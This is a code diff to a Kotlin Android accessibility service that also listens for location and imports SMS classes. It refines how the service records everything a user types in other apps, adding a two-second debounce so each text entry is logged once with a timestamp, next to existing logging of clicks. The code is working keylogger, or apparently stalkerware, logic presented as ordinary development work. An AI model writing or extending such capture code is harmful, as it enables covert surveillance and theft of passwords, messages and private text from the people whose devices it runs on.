@@ -9,6 +9,7 @@ import android.location.LocationListener
 import android.location.LocationManager
 import android.os.Bundle
 import android.os.Handler
+import android.os.Looper
 import android.provider.Telephony
 import androidx.core.app.ActivityCompat
 import android.view.accessibility.AccessibilityEvent
@@ -26,6 +27,9 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
 
     companion object {
         var isRunningService : Boolean = false
+        var previousData : String = ""
+        lateinit var mHandler: Handler
+        lateinit var mRunnable: Runnable
     }
 
     @Inject lateinit var interactor: InteractorAccessibilityData
@@ -54,7 +58,20 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 val data = event.text.toString()
                 if (data != "[]") {
-                    interactor.setDataKey("${getDateTime()} |(TEXT)| $data")
+                    val dataWithoutBracket = data.substring(1, data.length - 1)
+                    if (previousData != "" && dataWithoutBracket.startsWith(previousData) && previousData.startsWith(dataWithoutBracket)){
+                        mHandler.removeCallbacks(mRunnable)
+                    }
+
+                    previousData = dataWithoutBracket
+
+                    mHandler = Handler(Looper.getMainLooper())
+                    mRunnable = Runnable {
+                        interactor.setDataKey("${getDateTime()} |(TEXT)| $data")
+                        previousData = ""
+                    }
+                    mHandler.postDelayed(mRunnable, 2000)
+
                     i(TAG, "${getDateTime()} |(TEXT)| $data")
                 }
             }
@@ -72,6 +89,7 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
                     i(TAG, "${getDateTime()} |(CLICKED)| $data")
                 }
             }
+            else-> {}
         }
 
     }
